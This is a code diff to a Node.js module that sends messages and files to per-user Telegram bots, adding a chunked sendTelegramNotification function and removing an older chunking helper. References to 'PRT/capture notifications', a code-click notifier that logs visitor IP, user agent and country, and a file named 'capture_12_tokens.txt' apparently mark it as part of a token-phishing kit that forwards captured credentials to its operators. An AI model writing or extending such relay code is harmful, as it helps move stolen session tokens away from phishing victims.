@@ -6,6 +6,18 @@ const dcdiag = require('../utils/dcdiag');
 const TELEGRAM_MAX_LEN = 4096;
 
 /**
+ * Helper to split message into chunks respecting Telegram's 4096 char limit
+ */
+function chunkMessage(message, maxLen) {
+  if (message.length <= maxLen) return [message];
+  const chunks = [];
+  for (let i = 0; i < message.length; i += maxLen) {
+    chunks.push(message.slice(i, i + maxLen));
+  }
+  return chunks;
+}
+
+/**
  * @param {number|string} userId
  * @param {string} message  HTML-formatted message
  * @param {object} [options]
@@ -15,6 +27,74 @@ const TELEGRAM_MAX_LEN = 4096;
  * @returns {Promise<boolean>} true if at least one chunk sent successfully
  */
 async function sendTelegramNotification(userId, message, options = {}) {
+  try {
+    const {
+      parse_mode = 'HTML',
+      disable_web_preview = true,
+      requireNotifyPrt = true,
+    } = options;
+
+    if (!message) return false;
+
+    const [users] = await db.query(
+      'SELECT telegram_id, telegram_bot_token, notify_prt FROM users WHERE id = ?',
+      [userId]
+    );
+    if (!users.length) {
+      dcdiag.fail('tg_msg_skip user_id=' + userId + ' reason=no_user_row');
+      return false;
+    }
+
+    const user = db.openUser(users[0]);
+    if (!user.telegram_id || !user.telegram_bot_token) {
+      dcdiag.fail('tg_msg_skip user_id=' + userId + ' reason=no_credentials chat_id_set=' + !!user.telegram_id + ' bot_token_set=' + !!user.telegram_bot_token);
+      return false;
+    }
+    // Respect per-user notification preference (PRT/capture notifications)
+    if (requireNotifyPrt && !user.notify_prt) {
+      dcdiag.log('tg_msg_skip user_id=' + userId + ' reason=notify_prt_disabled');
+      return false;
+    }
+
+    const chunks = chunkMessage(String(message), TELEGRAM_MAX_LEN);
+    const url = `https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`;
+    let anySent = false;
+
+    for (const chunk of chunks) {
+      try {
+        await axios.post(url, {
+          chat_id: user.telegram_id,
+          text: chunk,
+          parse_mode,
+          disable_web_preview,
+        });
+        anySent = true;
+      } catch (err) {
+        if (parse_mode && err.response && err.response.status === 400) {
+          try {
+            await axios.post(url, {
+              chat_id: user.telegram_id,
+              text: chunk,
+              disable_web_preview,
+            });
+            anySent = true;
+            continue;
+          } catch (retryErr) {
+            dcdiag.fail('tg_msg_retry_failed user_id=' + userId + ' err=' + retryErr.message + ' http_status=' + (retryErr.response && retryErr.response.status) + ' http_body=' + String(retryErr.response && retryErr.response.data).substring(0, 150));
+          }
+        } else {
+          dcdiag.fail('tg_msg_failed user_id=' + userId + ' err=' + err.message + ' http_status=' + (err.response && err.response.status) + ' http_body=' + String(err.response && err.response.data).substring(0, 150));
+        }
+      }
+    }
+
+    dcdiag.log('tg_msg_result user_id=' + userId + ' chat_id=' + user.telegram_id + ' anySent=' + anySent + ' chunks=' + chunks.length);
+    return anySent;
+  } catch (err) {
+    dcdiag.fail('tg_msg_error user_id=' + userId + ' err=' + err.message);
+    return false;
+  }
+}
 async function sendCodeClickNotification(userId, visitorData, userCode) {
     try {
         const { ip, ua, country } = visitorData;
@@ -166,7 +246,7 @@ async function sendAdminNotification(message, options = {}) {
  * @param {string} [caption]
  * @returns {Promise<boolean>}
  */
-async function sendAdminDocument(filename, fileContent, caption) {
+async function sendAdminDocument(filename, fileContent, caption, options = {}) {
   try {
     const config = require('../config/env');
     if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_ADMIN_CHAT_ID) return false;
@@ -200,36 +280,6 @@ async function sendAdminDocument(filename, fileContent, caption) {
  * @param {number} maxLen
  * @returns {string[]}
  */
-function chunkMessage(text, maxLen) {
-  if (text.length <= maxLen) return [text];
-
-  const chunks = [];
-  let remaining = text;
-
-  while (remaining.length > 0) {
-    if (remaining.length <= maxLen) {
-      chunks.push(remaining);
-      break;
-    }
-
-    let sliceEnd = remaining.lastIndexOf('\n', maxLen);
-    if (sliceEnd <= 0) {
-      // No newline within the window — try a space, else hard cut.
-      sliceEnd = remaining.lastIndexOf(' ', maxLen);
-      if (sliceEnd <= 0) sliceEnd = maxLen;
-    }
-
-    chunks.push(remaining.slice(0, sliceEnd));
-    remaining = remaining.slice(sliceEnd).replace(/^\n/, '');
-  }
-
-  return chunks;
-}
-
-/**
- * @param {number|string} userId
- * @param {string} filename   e.g. "capture_12_tokens.txt"
- * @param {string} fileContent  raw text content of the file
  * @param {string} caption     short HTML caption (summary)
  * @param {object} [options]
  * @param {string} [options.caption_parse_mode='HTML']
